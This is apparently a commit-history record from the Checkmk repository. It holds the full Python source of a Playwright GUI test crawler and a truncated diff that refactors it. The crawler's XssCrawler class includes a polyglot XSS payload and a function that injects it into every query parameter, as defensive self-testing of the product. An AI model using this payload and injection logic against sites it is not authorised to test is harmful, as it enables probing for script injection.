requested\") ignore_texts=[ \"This view can only be used in mobile mode.\", \"Missing context information\", \"miss some required context information\", \"There are no metrics meeting your context filters\", \"license usage report\", ] for element in soup.select(\"div.error\"): inner_html=str(element) if not any(ignore_text in inner_html for ignore_text in ignore_texts): self.handle_error(url, \"HtmlError\", f\"Found error:{inner_html}\") def check_frames(self, url: Url, soup: BeautifulSoup) -> None: self.check_referenced(url, soup, \"frame\", \"src\") def check_iframes(self, url: Url, soup: BeautifulSoup) -> None: self.check_referenced(url, soup, \"iframe\", \"src\") def check_links(self, url: Url, soup: BeautifulSoup) -> None: self.check_referenced(url, soup, \"a\", \"href\") def check_referenced(self, referer_url: Url, soup: BeautifulSoup, tag: str, attr: str) -> None: elements=soup.find_all(tag) for element in elements: orig_url=element.get(attr) if orig_url is None: continue normalized_orig_url=self.normalize_url(orig_url) if normalized_orig_url is None: continue url=Url(normalized_orig_url, orig_url=orig_url, referer_url=referer_url.url) try: self.verify_is_valid_url(url.url) except InvalidUrl as invalid_url: self.handle_skipped_reference( url, reason=\"invalid-url\", message=invalid_url.message ) else: self.handle_new_reference(url, referer_url=referer_url) def check_logs(self, url: Url, logs: Iterable[str]) -> None: accepted_logs=[ \"Missing object for SimpleBar initiation.\", ] for log in logs: if not any(accepted_log in log for accepted_log in accepted_logs): self.handle_error(url, error_type=\"JavascriptError\", message=log) def verify_is_valid_url(self, url: str) -> None: parsed=urlsplit(url) if parsed.scheme !=\"http\": raise InvalidUrl(url, f\"invalid scheme:{parsed.scheme}\") if url.startswith(\"http://\") and not url.startswith(self.site.internal_url): raise InvalidUrl(url, \"external url\") if( not parsed.path.startswith(f\"/{self.site.id}/check_mk\") or \"../pnp4nagios/\" in parsed.path or \"../nagvis/\" in parsed.path or \"check_mk/plugin-api\" in parsed.path or \"../nagios/\" in parsed.path ): raise InvalidUrl(url, \"non Check_MK URL\") file_name=os.path.basename(parsed.path) query=dict(parse_qsl(parsed.query, keep_blank_values=True)) if \"index.py?start_url=\" in url: raise InvalidUrl(url, \"link to index with current URL\") if \"logout.py\" in url: raise InvalidUrl(url, \"logout URL\") if \"_transid=\" in url: raise InvalidUrl(url, \"action URL\") if \"selection=\" in url: raise InvalidUrl(url, \"selection URL\") if \"mode=check_manpage\" in url and \"wato.py\" in url: raise InvalidUrl(url, \"man page URL\") if \"view.py\" in url and \"filled_in=filter\" in url: raise InvalidUrl(url, \"filled in filter URL\") if \"edit_view.py\" in url: raise InvalidUrl(url, \"view editor URL\") if parsed.path.startswith(f\"/{self.site.id}/check_mk/agents/\"): raise InvalidUrl(url, \"agent download file\") if file_name==\"combined_graphs.py\" and not query.get(\"host\"): raise InvalidUrl(url, \"combined graph with unrestricted context\") if file_name==\"view.py\" and query.get(\"owner\")==\"\": raise InvalidUrl(url, \"explicit empty owner(redundant view)\") if file_name==\"werk.py\" and query.get(\"werk\") not in[ \"11363\", \"5605\", \"12908\", \"12389\", \"7352\", \"11361\", \"12149\", \"5744\", \"8350\", \"6240\", \"5958\", ]: raise InvalidUrl(url, \"Skip werk pages\") def normalize_url(self, url: str) -> str: url=urljoin(self.site.internal_url, url.rstrip(\" parsed=list(urlsplit(url)) parsed[3]=urlencode(sorted(parse_qsl(parsed[3], keep_blank_values=True))) return urlunsplit(parsed) def report(self) -> None: self.site.save_results() self._write_report_file() error_messages=list( chain.from_iterable( ( [ f\"[{url} -found on{error.referer_url}]{error.message}\" for error in result.errors ] for url, result in self.results.items() if result.errors ) ) ) if error_messages: joined_error_messages=\"\\n\".join(error_messages) raise Exception( f\"Crawled{len(self.results)} URLs in{self.duration} seconds. Failures:\\n{joined_error_messages}\" ) def _write_report_file(self) -> None: root=etree.Element(\"testsuites\") testsuite=etree.SubElement(root, \"testsuite\") tests, errors, skipped=0, 0, 0 for url, result in self.results.items(): testcase=etree.SubElement( testsuite, \"testcase\", attrib={ \"name\": url, \"classname\": \"crawled_urls\", \"time\": f\"{result.duration:.3f}\", }, ) if result.skipped is not None: skipped +=1 etree.SubElement( testcase, \"skipped\", attrib={ \"type\": result.skipped.reason, \"message\": result.skipped.message, }, ) elif result.errors: errors +=1 for error in result.errors: failure=etree.SubElement( testcase, \"failure\", attrib={\"message\": error.message} ) failure.text=f\"referer_url:{error.referer_url}\" tests +=1 testsuite.attrib[\"name\"]=\"test-gui-crawl\" testsuite.attrib[\"tests\"]=str(tests) testsuite.attrib[\"skipped\"]=str(skipped) testsuite.attrib[\"errors\"]=str(errors) testsuite.attrib[\"failures\"]=\"0\" testsuite.attrib[\"time\"]=f\"{self.duration:.3f}\" testsuite.attrib[\"timestamp\"]=time.strftime(\"%Y-%m-%dT%H:%M:%S\") self.report_file.write_bytes(etree.tostring(root, pretty_print=True)) class XssCrawler(Crawler): Payload=\"\"\"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+console.log(\"XSS vulnerability\")//'>\"\"\" def handle_error(self, url: Url, error_type: str, message: str=\"\") -> bool: if error_type==\"HtmlError\": return False if error_type==\"UnknownContentType\" and message==\"application/problem+json\": return False return super().handle_error(url, error_type, message) def handle_page_done(self, url: Url, duration: float) -> bool: if super().handle_page_done(url, duration): for mutated_url in mutate_url_with_xss_payload(url, self.Payload): super().handle_new_reference(mutated_url, url) return True return False def mutate_url_with_xss_payload(url: Url, payload: str) -> Generator[Url, None, None]: \"\"\"For each query parameter in `url`, produce a URL where that parameter is set to `payload` >>> urls=mutate_url_with_xss_payload(Url(\"example.com?foo=bar&empty=\"), \"PAYLOAD\") >>> next(urls).url 'example.com?foo=PAYLOAD&empty=' >>> next(urls).url 'example.com?foo=bar&empty=PAYLOAD' (Be aware that this doctest is not run.) \"\"\" parsed_url=urlparse(url.url) parsed_query=parse_qs(parsed_url.query, keep_blank_values=True) for key, values in parsed_query.items(): for change_idx in range(len(values)): mutated_values=[ payload if idx==change_idx else value for idx, value in enumerate(values) ] mutated_query={**parsed_query, key: mutated_values} mutated_url=parsed_url._replace(query=urlencode(mutated_query, doseq=True)) yield Url( url=mutated_url.geturl(), referer_url=url.referer_url, orig_url=url.orig_url, follow=False, ) ",
                    "sourceWithComments": "#!/usr/bin/env python3\n# Copyright (C) 2019 Checkmk GmbH - License: GNU General Public License v2\n# This file is part of Checkmk (https://checkmk.com). It is subject to the terms and\n# conditions defined in the file COPYING, which is part of this source code package.\n\nimport asyncio\nimport io\nimport json\nimport logging\nimport os\nimport re\nimport tarfile\nimport time\nfrom collections import deque\nfrom collections.abc import Generator, Iterable, MutableSequence\nfrom dataclasses import dataclass, field\nfrom itertools import chain\nfrom pathlib import Path\nfrom types import TracebackType\nfrom typing import NamedTuple\nfrom urllib.parse import parse_qs, parse_qsl, urlencode, urljoin, urlparse, urlsplit, urlunsplit\n\nimport playwright.async_api\nimport requests\nimport requests.utils\nfrom bs4 import BeautifulSoup\nfrom lxml import etree\nfrom playwright.async_api import async_playwright\n\nfrom tests.testlib.site import Site\n\nlogger = logging.getLogger()\n\nCrashIdRegex = r\"\\w{8}-\\w{4}-\\w{4}-\\w{4}-\\w{12}\"\nCrashLinkRegex = rf\"crash\\.py\\?crash_id=({CrashIdRegex})\"\n\n\nclass PageContent(NamedTuple):\n    content: str\n    logs: Iterable[str]\n\n\nclass Progress:\n    def __init__(self, report_interval: float = 10) -> None:\n        self.started = time.time()\n        self.done_total = 0\n        self.report_interval = report_interval\n        self.next_report = 0.0\n\n    def __enter__(self) -> \"Progress\":\n        self.started = time.time()\n        self.next_report = self.started + self.report_interval\n        self.done_total = 0\n        return self\n\n    def __exit__(\n        self,\n        exc_type: type[BaseException] | None,\n        exc_val: BaseException | None,\n        exc_tb: TracebackType | None,\n    ) -> None:\n        logger.info(\n            \"%d done in %.3f secs %s\",\n            self.done_total,\n            self.duration,\n            \"\" if exc_type is None else f\"(canceled with {exc_type})\",\n        )\n\n    @property\n    def duration(self) -> float:\n        return time.time() - self.started\n\n    def done(self, done: int) -> None:\n        self.done_total += done\n        if time.time() > self.next_report:\n            logger.info(\n                \"rate: %.2f per sec (%d total)\", self.done_total / self.duration, self.done_total\n            )\n            self.next_report = time.time() + self.report_interval\n\n\nclass InvalidUrl(Exception):\n    def __init__(self, url: str, message: str) -> None:\n        super().__init__(url, message)\n        self.url = url\n        self.message = message\n\n\nclass Url:\n    def __init__(\n        self,\n        url: str,\n        orig_url: str | None = None,\n        referer_url: str | None = None,\n        follow: bool = True,\n    ) -> None:\n        self.url = url\n        self.orig_url = orig_url\n        self.referer_url = referer_url\n        self.follow = follow\n\n    def __hash__(self) -> int:\n        return hash(self.url)\n\n    # Strip host and site prefix\n    def neutral_url(self) -> str:\n        return \"check_mk/\" + self.url.split(\"/check_mk/\", 1)[1]\n\n    # Strip proto and host\n    def url_without_host(self) -> str:\n        parsed = list(urlsplit(self.url))\n        parsed[0] = \"\"\n        parsed[1] = \"\"\n        return urlunsplit(parsed)\n\n\n@dataclass\nclass ErrorResult:\n    message: str\n    referer_url: str | None = None\n\n\n@dataclass\nclass CrawlSkipInfo:\n    reason: str\n    message: str\n\n\n@dataclass\nclass CrawlResult:\n    duration: float = 0.0\n    skipped: CrawlSkipInfo | None = None\n    errors: MutableSequence[ErrorResult] = field(default_factory=list)\n\n\ndef format_js_error(error: playwright.async_api.Error) -> str:\n    return f\"{error.name}: {error.message}\\n{error.stack}\"\n\n\ndef try_find_frame_named_main(page: playwright.async_api.Page) -> playwright.async_api.Frame:\n    # There are two main frames: Playwright main_frame is the outer frame, the\n    # frame named main is the frame with the name \"main\". This is where the\n    # interesting checkmk stuff is happening, so we try to find it, but fall\n    # back to the outer frame if we can not find it.\n    for frame in page.frames:\n        if frame.name == \"main\":\n            return frame\n    return page.main_frame\n\n\nclass Crawler:\n    def __init__(self, test_site: Site, report_file: str | None, max_urls: int = 0) -> None:\n        self.duration = 0.0\n        self.results: dict[str, CrawlResult] = {}\n        self.site = test_site\n        self.report_file = Path(report_file or self.site.result_dir()) / \"crawl.xml\"\n        self.requests_session = requests.Session()\n        self._find_more_urls: bool = True\n        self._ignored_content_types: set[str] = {\n            \"application/json\",\n            \"application/pdf\",\n            \"application/x-deb\",\n            \"application/x-debian-package\",\n            \"application/x-gzip\",\n            \"application/x-mkp\",\n            \"application/x-msdos-program\",\n            \"application/x-msi\",\n            \"application/x-pkg\",\n            \"application/x-redhat-package-manager\",\n            \"application/x-rpm\",\n            \"application/x-tar\",\n            \"application/x-tgz\",\n            \"application/x-yaml; charset=utf-8\",\n            \"image/gif\",\n            \"image/png\",\n            \"image/svg+xml\",\n            \"text/x-c++src\",\n            \"text/x-chdr\",\n            \"text/x-sh\",\n        }\n\n        # limit minimum value to 0.\n        self._max_urls = max(0, max_urls)\n        self._todos = deque([Url(self.site.internal_url)])\n\n    async def crawl(self, max_tasks: int) -> None:\n        async with async_playwright() as pw:\n            browser = await pw.chromium.launch()\n            storage_state = await self.access_storage_state(browser)\n            # makes sure authentication cookies is also available in the \"requests\" session.\n            for cookie_dict in storage_state[\"cookies\"]:\n                self.requests_session.cookies.set(\n                    name=cookie_dict[\"name\"],\n                    value=cookie_dict[\"value\"],\n                )\n            # special-case\n            search_limited_urls: bool = self._max_urls > 0\n            if search_limited_urls and self._max_urls < max_tasks:\n                max_tasks = self._max_urls\n            with Progress() as progress:\n                tasks: set = set()\n                while tasks or self._todos and self._find_more_urls:\n                    try:\n                        url = self._todos.popleft()\n                    except IndexError:\n                        logger.debug(\"Populating URLs/TODOs ...\")\n                        url = None\n                    if url and len(tasks) < max_tasks:\n                        logger.debug(\"Checking URL %s\", url.url)\n                        tasks.add(asyncio.create_task(self.visit_url(browser, storage_state, url)))\n                    else:\n                        logger.debug(\n                            \"Maximum tasks assgined. Waiting for tasks to be completed ...\"\n                        )\n                    done, tasks = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)\n                    progress.done(done=sum(1 for t in done if t.result()))\n                    if search_limited_urls:\n                        self._find_more_urls = progress.done_total < self._max_urls\n                    self.duration = progress.duration\n            await browser.close()\n\n    async def access_storage_state(\n        self, browser: playwright.async_api.Browser\n    ) -> playwright.async_api.StorageState:\n        context = await browser.new_context()\n        page = await context.new_page()\n\n        async def handle_page_error(error: playwright.async_api.Error) -> None:\n            self.handle_error(\n                Url(try_find_frame_named_main(page).url),\n                error_type=\"JavascriptCreateError\",\n                message=format_js_error(error),\n            )\n\n        page.on(\"pageerror\", handle_page_error)\n\n        await page.goto(self.site.internal_url)\n        await page.fill('input[name=\"_username\"]', \"cmkadmin\")\n        await page.fill('input[name=\"_password\"]', \"cmk\")\n        async with page.expect_navigation():\n            await page.click(\"text=Login\")\n        await page.close()\n        storage_state = await context.storage_state()\n        await context.close()\n\n        return storage_state\n\n    def _ensure_result(self, url: Url) -> None:\n        if url.url not in self.results:\n            self.results[url.url] = CrawlResult()\n\n    def handle_error(self, url: Url, error_type: str, message: str = \"\") -> bool:\n        self._ensure_result(url)\n        self.results[url.url].errors.append(\n            ErrorResult(referer_url=url.referer_url, message=f\"{error_type}: {message}\")\n        )\n        logger.error(\"page error: %s: %s, (%s)\", error_type, message, url.url)\n        return True\n\n    def handle_new_reference(self, url: Url, referer_url: Url) -> bool:\n        if referer_url.follow and url.url not in self.results:\n            self.results[url.url] = CrawlResult()\n            self._todos.append(url)\n            return True\n        return False\n\n    def handle_skipped_reference(self, url: Url, reason: str, message: str) -> None:\n        self._ensure_result(url)\n        if self.results[url.url].skipped is None:\n            self.results[url.url].skipped = CrawlSkipInfo(\n                reason=reason,\n                message=message,\n            )\n\n    def handle_page_done(self, url: Url, duration: float) -> bool:\n        self._ensure_result(url)\n        self.results[url.url].duration = duration\n        logger.info(\"page done in %.2f secs (%s)\", duration, url.url)\n        return self.results[url.url].skipped is None and len(self.results[url.url].errors) == 0\n\n    def handle_crash_reports(self) -> None:\n        crash_reports_url = urljoin(self.site.internal_url, \"view.py?view_name=crash_reports\")\n        try:\n            response = self.requests_session.get(crash_reports_url)\n        except requests.RequestException as exception:\n            self.handle_error(Url(url=crash_reports_url), \"GetCrashReportsFailed\", str(exception))\n            return\n\n        if response.status_code != 200:\n            self.handle_error(\n                Url(url=crash_reports_url), \"CrashReportsPageFailed\", str(response.status_code)\n            )\n\n        for crash_id_match in re.finditer(rf\"crash_id=({CrashIdRegex})\", response.text):\n            self.handle_crash_report(Url(\"unknown url\"), crash_id_match.group(1))\n\n    def handle_crash_report(self, url: Url, crash_id: str) -> bool:\n        crash_report_url = urljoin(\n            self.site.internal_url,\n            f\"download_crash_report.py?crash_id={crash_id}&site={self.site.id}\",\n        )\n        try:\n            response = self.requests_session.get(crash_report_url)\n        except requests.RequestException as exception:\n            self.handle_error(\n                Url(url=crash_report_url, referer_url=url.url),\n                \"CrashReportDownloadFailed\",\n                str(exception),\n            )\n            return False\n\n        status_code = response.status_code\n        expected_status_code = 200\n        if status_code != expected_status_code:\n            self.handle_error(\n                Url(url=crash_report_url, referer_url=url.url),\n                \"CrashReportDownloadFailed\",\n                f\"status code: {status_code}, expected: {expected_status_code}\",\n            )\n            return False\n\n        content_type = response.headers.get(\"content-type\")\n        expected_content_type = \"application/x-tgz\"\n        if content_type != expected_content_type:\n            self.handle_error(\n                Url(url=crash_report_url, referer_url=url.url),\n                \"CrashReportDownloadFailed\",\n                f\"content-type: {content_type}, expected: {expected_content_type}\",\n            )\n            return False\n\n        try:\n            with tarfile.open(fileobj=io.BytesIO(response.content)) as tar:\n                crash_info_file = tar.extractfile(\"crash.info\")\n                if crash_info_file is None:\n                    self.handle_error(\n                        Url(url=crash_report_url, referer_url=url.url),\n                        \"EmptyCrashReportTarFile\",\n                        message=crash_id,\n                    )\n                    return False\n\n                crash_info = json.loads(crash_info_file.read().decode(\"utf-8\"))\n        except tarfile.ReadError:\n            self.handle_error(\n                Url(url=crash_report_url, referer_url=url.url),\n                \"InvalidCrashReportTarFile\",\n                repr(response.content),\n            )\n            return False\n\n        # reads the crash report and dumps it indented for better readability\n        crash_report = json.dumps(crash_info, indent=4)\n        return self.handle_error(url, \"CrashReport\", message=crash_report)\n\n    async def visit_url(\n        self,\n        browser: playwright.async_api.Browser,\n        storage_state: playwright.async_api.StorageState,\n        url: Url,\n    ) -> bool:\n        start = time.time()\n\n        content_type = self.requests_session.head(url.url).headers[\"content-type\"]\n        if content_type.startswith(\"text/html\"):\n            try:\n                page_content = await self.get_page_content(browser, storage_state, url)\n                await self.validate(url, page_content.content, page_content.logs)\n            except playwright.async_api.Error as e:\n                self.handle_error(url, \"BrowserError\", repr(e))\n        elif any(\n            content_type.startswith(ignored_start) for ignored_start in [\"text/plain\", \"text/csv\"]\n        ):\n            self.handle_skipped_reference(url, reason=\"content-type\", message=content_type)\n        elif content_type in self._ignored_content_types:\n            self.handle_skipped_reference(url, reason=\"content-type\", message=content_type)\n        else:\n            self.handle_error(url, error_type=\"UnknownContentType\", message=content_type)\n\n        return self.handle_page_done(url, duration=time.time() - start)\n\n    @staticmethod\n    async def get_page_content(\n        browser: playwright.async_api.Browser,\n        storage_state: playwright.async_api.StorageState,\n        url: Url,\n    ) -> PageContent:\n        logs = []\n\n        async def handle_console_messages(msg: playwright.async_api.ConsoleMessage) -> None:\n            location = (\n                f\"{msg.location['url']}:{msg.location['lineNumber']}:{msg.location['columnNumber']}\"\n            )\n            logs.append(f\"{msg.type}: {msg.text} ({location})\")\n\n        async def handle_page_error(error: playwright.async_api.Error) -> None:\n            logs.append(format_js_error(error))\n\n        page = await browser.new_page(storage_state=storage_state)\n        page.on(\"pageerror\", handle_page_error)\n        page.on(\"console\", handle_console_messages)\n        try:\n            await page.goto(url.url, timeout=60 * 1000)\n            return PageContent(content=await page.content(), logs=logs)\n        finally:\n            await page.close()\n\n    async def validate(self, url: Url, text: str, logs: Iterable[str]) -> None:\n        def blocking() -> None:\n            soup = BeautifulSoup(text, \"lxml\")\n            self.check_content(url, soup)\n            self.check_links(url, soup)\n            self.check_frames(url, soup)\n            self.check_iframes(url, soup)\n            self.check_logs(url, logs)\n\n        loop = asyncio.get_running_loop()\n        await loop.run_in_executor(None, blocking)\n\n    def check_content(self, url: Url, soup: BeautifulSoup) -> None:\n        if soup.find(\"div\", id=\"login\") is not None:\n            self.handle_error(url, \"LoginError\", \"login requested\")\n\n        ignore_texts = [\n            \"This view can only be used in mobile mode.\",\n            # Some single context views are accessed without their context information, which\n            # results in a helpful error message since 1.7. These are not failures that this test\n            # should report.\n            \"Missing context information\",\n            # Same for availability views that cannot be accessed anymore\n            # from views with missing context\n            \"miss some required context information\",\n            # Same for dashlets that are related to a specific context\n            \"There are no metrics meeting your context filters\",\n            # Some of the errors are only visible to the user when trying to submit and\n            # some are visible for the reason that the GUI crawl sites do not have license\n            # information configured -> ignore the errors\n            \"license usage report\",\n        ]\n        for element in soup.select(\"div.error\"):\n            inner_html = str(element)\n            if not any(ignore_text in inner_html for ignore_text in ignore_texts):\n                self.handle_error(url, \"HtmlError\", f\"Found error: {inner_html}\")\n\n    def check_frames(self, url: Url, soup: BeautifulSoup) -> None:\n        self.check_referenced(url, soup, \"frame\", \"src\")\n\n    def check_iframes(self, url: Url, soup: BeautifulSoup) -> None:\n        self.check_referenced(url, soup, \"iframe\", \"src\")\n\n    def check_links(self, url: Url, soup: BeautifulSoup) -> None:\n        self.check_referenced(url, soup, \"a\", \"href\")\n\n    def check_referenced(self, referer_url: Url, soup: BeautifulSoup, tag: str, attr: str) -> None:\n        elements = soup.find_all(tag)\n        for element in elements:\n            orig_url = element.get(attr)\n            if orig_url is None:\n                continue  # Skip elements that don't have the attribute in question\n            normalized_orig_url = self.normalize_url(orig_url)\n            if normalized_orig_url is None:\n                continue\n            url = Url(normalized_orig_url, orig_url=orig_url, referer_url=referer_url.url)\n            try:\n                self.verify_is_valid_url(url.url)\n            except InvalidUrl as invalid_url:\n                self.handle_skipped_reference(\n                    url, reason=\"invalid-url\", message=invalid_url.message\n                )\n            else:\n                self.handle_new_reference(url, referer_url=referer_url)\n\n    def check_logs(self, url: Url, logs: Iterable[str]) -> None:\n        accepted_logs = [\n            \"Missing object for SimpleBar initiation.\",\n        ]\n        for log in logs:\n            if not any(accepted_log in log for accepted_log in accepted_logs):\n                self.handle_error(url, error_type=\"JavascriptError\", message=log)\n\n    def verify_is_valid_url(self, url: str) -> None:  # pylint: disable=too-many-branches\n        parsed = urlsplit(url)\n        if parsed.scheme != \"http\":\n            raise InvalidUrl(url, f\"invalid scheme: {parsed.scheme}\")\n\n        # skip external urls\n        if url.startswith(\"http://\") and not url.startswith(self.site.internal_url):\n            raise InvalidUrl(url, \"external url\")\n        # skip non check_mk urls\n        if (\n            not parsed.path.startswith(f\"/{self.site.id}/check_mk\")\n            or \"../pnp4nagios/\" in parsed.path\n            or \"../nagvis/\" in parsed.path\n            or \"check_mk/plugin-api\" in parsed.path\n            or \"../nagios/\" in parsed.path\n        ):\n            raise InvalidUrl(url, \"non Check_MK URL\")\n\n        file_name = os.path.basename(parsed.path)\n        query = dict(parse_qsl(parsed.query, keep_blank_values=True))\n\n        # skip current url with link to index\n        if \"index.py?start_url=\" in url:\n            raise InvalidUrl(url, \"link to index with current URL\")\n        if \"logout.py\" in url:\n            raise InvalidUrl(url, \"logout URL\")\n        if \"_transid=\" in url:\n            raise InvalidUrl(url, \"action URL\")\n        if \"selection=\" in url:\n            raise InvalidUrl(url, \"selection URL\")\n        # TODO: Remove this exclude when ModeCheckManPage works without an\n        # automation call. Currently we have to use such a call to enrich the\n        # man page with some additional info from config.check_info, see\n        # AutomationGetCheckManPage.\n        if \"mode=check_manpage\" in url and \"wato.py\" in url:\n            raise InvalidUrl(url, \"man page URL\")\n        # Don't follow filled in filter form views\n        if \"view.py\" in url and \"filled_in=filter\" in url:\n            raise InvalidUrl(url, \"filled in filter URL\")\n        # Don't follow the view editor\n        if \"edit_view.py\" in url:\n            raise InvalidUrl(url, \"view editor URL\")\n        # Skip agent download files\n        if parsed.path.startswith(f\"/{self.site.id}/check_mk/agents/\"):\n            raise InvalidUrl(url, \"agent download file\")\n\n        # Skip combined graph pages which take way too long for our crawler with unrestricted\n        # contexts. These pages take >10 seconds to load while crawling\n        if file_name == \"combined_graphs.py\" and not query.get(\"host\"):\n            raise InvalidUrl(url, \"combined graph with unrestricted context\")\n\n        # From the list visuals page (e.g. edit_views.py) there are links with explicit \"owner=\"\n        # query string. These parameters are useful for admins, in case they want to display the\n        # view of a specific user. In our crawl scenario this results in all view related pages\n        # (regular view, availability sub-views, reports and so on) being crawled twice. To reduce\n        # the number of URLs being crawled, we exclude the view.py with empty \"owner\" parameter.\n        if file_name == \"view.py\" and query.get(\"owner\") == \"\":\n            raise InvalidUrl(url, \"explicit empty owner (redundant view)\")\n\n        # Do not crawl the thousands of werk pages. Visit at least some of them to be able to catch\n        # some general rendering issues.\n        if file_name == \"werk.py\" and query.get(\"werk\") not in [\n            \"11363\",\n            \"5605\",\n            \"12908\",\n            \"12389\",\n            \"7352\",\n            \"11361\",\n            \"12149\",\n            \"5744\",\n            \"8350\",\n            \"6240\",\n            \"5958\",\n        ]:\n            raise InvalidUrl(url, \"Skip werk pages\")\n\n    def normalize_url(self, url: str) -> str:\n        url = urljoin(self.site.internal_url, url.rstrip(\"#\"))\n        parsed = list(urlsplit(url))\n        parsed[3] = urlencode(sorted(parse_qsl(parsed[3], keep_blank_values=True)))\n        return urlunsplit(parsed)\n\n    def report(self) -> None:\n        self.site.save_results()\n        self._write_report_file()\n\n        error_messages = list(\n            chain.from_iterable(\n                (\n                    [\n                        f\"[{url} - found on {error.referer_url}] {error.message}\"\n                        for error in result.errors\n                    ]\n                    for url, result in self.results.items()\n                    if result.errors\n                )\n            )\n        )\n        if error_messages:\n            joined_error_messages = \"\\n\".join(error_messages)\n            raise Exception(\n                f\"Crawled {len(self.results)} URLs in {self.duration} seconds. Failures:\\n{joined_error_messages}\"\n            )\n\n    def _write_report_file(self) -> None:\n        root = etree.Element(\"testsuites\")\n        testsuite = etree.SubElement(root, \"testsuite\")\n\n        tests, errors, skipped = 0, 0, 0\n        for url, result in self.results.items():\n            testcase = etree.SubElement(\n                testsuite,\n                \"testcase\",\n                attrib={\n                    \"name\": url,\n                    \"classname\": \"crawled_urls\",\n                    \"time\": f\"{result.duration:.3f}\",\n                },\n            )\n            if result.skipped is not None:\n                skipped += 1\n                etree.SubElement(\n                    testcase,\n                    \"skipped\",\n                    attrib={\n                        \"type\": result.skipped.reason,\n                        \"message\": result.skipped.message,\n                    },\n                )\n            elif result.errors:\n                errors += 1\n                for error in result.errors:\n                    failure = etree.SubElement(\n                        testcase, \"failure\", attrib={\"message\": error.message}\n                    )\n                    failure.text = f\"referer_url: {error.referer_url}\"\n\n            tests += 1\n\n        testsuite.attrib[\"name\"] = \"test-gui-crawl\"\n        testsuite.attrib[\"tests\"] = str(tests)\n        testsuite.attrib[\"skipped\"] = str(skipped)\n        testsuite.attrib[\"errors\"] = str(errors)\n        testsuite.attrib[\"failures\"] = \"0\"\n        testsuite.attrib[\"time\"] = f\"{self.duration:.3f}\"\n        testsuite.attrib[\"timestamp\"] = time.strftime(\"%Y-%m-%dT%H:%M:%S\")\n\n        self.report_file.write_bytes(etree.tostring(root, pretty_print=True))\n\n\nclass XssCrawler(Crawler):\n    Payload = \"\"\"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+console.log(\"XSS vulnerability\")//'>\"\"\"\n\n    def handle_error(self, url: Url, error_type: str, message: str = \"\") -> bool:\n        if error_type == \"HtmlError\":\n            return False\n        if error_type == \"UnknownContentType\" and message == \"application/problem+json\":\n            return False\n        return super().handle_error(url, error_type, message)\n\n    def handle_page_done(self, url: Url, duration: float) -> bool:\n        if super().handle_page_done(url, duration):\n            for mutated_url in mutate_url_with_xss_payload(url, self.Payload):\n                super().handle_new_reference(mutated_url, url)\n            return True\n        return False\n\n\ndef mutate_url_with_xss_payload(url: Url, payload: str) -> Generator[Url, None, None]:\n    \"\"\"For each query parameter in `url`, produce a URL where that parameter is set to `payload`\n\n    >>> urls = mutate_url_with_xss_payload(Url(\"example.com?foo=bar&empty=\"), \"PAYLOAD\")\n    >>> next(urls).url\n    'example.com?foo=PAYLOAD&empty='\n    >>> next(urls).url\n    'example.com?foo=bar&empty=PAYLOAD'\n\n    (Be aware that this doctest is not run.)\n    \"\"\"\n    parsed_url = urlparse(url.url)\n    parsed_query = parse_qs(parsed_url.query, keep_blank_values=True)\n    for key, values in parsed_query.items():\n        for change_idx in range(len(values)):\n            mutated_values = [\n                payload if idx == change_idx else value for idx, value in enumerate(values)\n            ]\n            mutated_query = {**parsed_query, key: mutated_values}\n            mutated_url = parsed_url._replace(query=urlencode(mutated_query, doseq=True))\n            yield Url(\n                url=mutated_url.geturl(),\n                referer_url=url.referer_url,\n                orig_url=url.orig_url,\n                follow=False,\n            )\n"
                }
            },
            "msg": "Reuse browser context between XSS crawl runs\n\nChange-Id: I9106383c03a249fc31ab25f233a9a5aeb8e78648"
        },
        "c5af67b3e5471e03123d72fe6d9271635317de04": {
            "url": "https://api.github.com/repos/Checkmk/checkmk/commits/c5af67b3e5471e03123d72fe6d9271635317de04",
            "html_url": "https://github.com/Checkmk/checkmk/commit/c5af67b3e5471e03123d72fe6d9271635317de04",
            "sha": "c5af67b3e5471e03123d72fe6d9271635317de04",
            "keyword": "XSS change",
            "diff": "diff --git a/tests/testlib/crawler.py b/tests/testlib/crawler.py\nindex e6ba362a67e..8c80c302233 100644\n--- a/tests/testlib/crawler.py\n+++ b/tests/testlib/crawler.py\n@@ -11,13 +11,14 @@\n import re\n import tarfile\n import time\n+import traceback\n from collections import deque\n from collections.abc import Generator, Iterable, MutableSequence\n from dataclasses import dataclass, field\n from itertools import chain\n from pathlib import Path\n from types import TracebackType\n-from typing import NamedTuple\n+from typing import NamedTuple, Sequence\n from urllib.parse import parse_qs, parse_qsl, urlencode, urljoin, urlparse, urlsplit, urlunsplit\n \n import playwright.async_api\n@@ -65,6 +66,8 @@ def __exit__(\n             self.duration,\n             \"\" if exc_type is None else f\"(canceled with {exc_type})\",\n         )\n+        if exc_type is not None:\n+            logger.error(\"\".join(traceback.format_exception(exc_type, exc_val, exc_tb)))\n \n     @property\n     def duration(self) -> float:\n@@ -183,46 +186,48 @@ def __init__(self, test_site: Site, report_file: str | None, max_urls: int = 0)\n         self._max_urls = max(0, max_urls)\n         self._todos = deque([Url(self.site.internal_url)])\n \n-    async def crawl(self, max_tasks: int) -> None:\n+    async def batch_test_urls(self, urls: Sequence[Url]) -> int:\n+        num_done = 0\n         async with async_playwright() as pw:\n             browser = await pw.chromium.launch()\n-            storage_state = await self.access_storage_state(browser)\n-            # makes sure authentication cookies is also available in the \"requests\" session.\n-            for cookie_dict in storage_state[\"cookies\"]:\n-                self.requests_session.cookies.set(\n-                    name=cookie_dict[\"name\"],\n-                    value=cookie_dict[\"value\"],\n-                )\n-            browser_context = await browser.new_context(storage_state=storage_state)\n-            # special-case\n-            search_limited_urls: bool = self._max_urls > 0\n-            if search_limited_urls and self._max_urls < max_tasks:\n-                max_tasks = self._max_urls\n-            with Progress() as progress:\n-                tasks: set = set()\n-                while tasks or self._todos and self._find_more_urls:\n-                    try:\n-                        url = self._todos.popleft()\n-                    except IndexError:\n-                        logger.debug(\"Populating URLs/TODOs ...\")\n-                        url = None\n-                    if url and len(tasks) < max_tasks:\n-                        logger.debug(\"Checking URL %s\", url.url)\n-                        tasks.add(asyncio.create_task(self.visit_url(browser_context, url)))\n-                    else:\n-                        logger.debug(\n-                            \"Maximum tasks assgined. Waiting for tasks to be completed ...\"\n-                        )\n-                    done, tasks = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)\n-                    progress.done(done=sum(1 for t in done if t.result()))\n-          